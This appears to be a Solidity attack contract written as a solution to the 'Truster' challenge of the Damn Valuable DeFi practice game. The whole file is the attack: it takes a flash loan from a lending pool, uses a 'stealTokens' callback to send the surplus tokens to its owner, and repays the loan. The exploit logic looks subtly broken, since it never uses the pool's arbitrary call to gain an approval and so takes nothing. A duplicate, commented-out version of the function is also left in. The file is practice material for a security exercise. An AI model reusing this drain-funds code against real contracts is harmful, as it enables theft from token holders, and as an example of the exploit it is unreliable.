// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TrusterLenderPool.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract TrusterAttacker {

    using SafeMath for uint256;

    TrusterLenderPool public pool;
    DamnValuableToken public token;
    address public owner;
    uint256 public amount;

    constructor(address _pool, address _token) {
        pool = TrusterLenderPool(_pool);
        token = DamnValuableToken(_token);
        owner = msg.sender;
    }

function attack(uint256 _amount) external {
    // Save amount for later use
    amount = _amount;

    // Data for the call to `flashLoan` function
    // The function signature of the function to be called in this contract from the `flashLoan` function
    bytes memory data = abi.encodeWithSignature("stealTokens()");

    // Call the `flashLoan` function with the amount to loan, the address of this contract (to receive the tokens and for the callback), 
    // and the data for the callback
    pool.flashLoan(_amount, address(this), address(this), data);
}


    function stealTokens() external {
    require(msg.sender == address(pool), "Not called from TrusterLenderPool");

    // Calculate tokens to steal
    uint256 balance = token.balanceOf(address(this));
    uint256 tokensToSteal = balance - amount;

    // Transfer stolen tokens to owner
    token.transfer(owner, tokensToSteal);

    // Repay the flash loan
    token.transfer(address(pool), amount);

        // require(msg.sender == address(pool), "Not called from TrusterLenderPool");

        // // Calculate tokens to steal
        // uint256 balance = token.balanceOf(address(this));
        // require(balance >= amount, "Balance is less than amount");

        // uint256 tokensToSteal = balance.sub(amount);

        // // Transfer stolen tokens to owner
        // token.transfer(owner, tokensToSteal);

        // // Repay the flash loan
        // token.transfer(address(pool), amount);
    }

function transferToPlayer() external {
    uint256 balance = token.balanceOf(address(this));
    token.transfer(owner, balance);
}

}
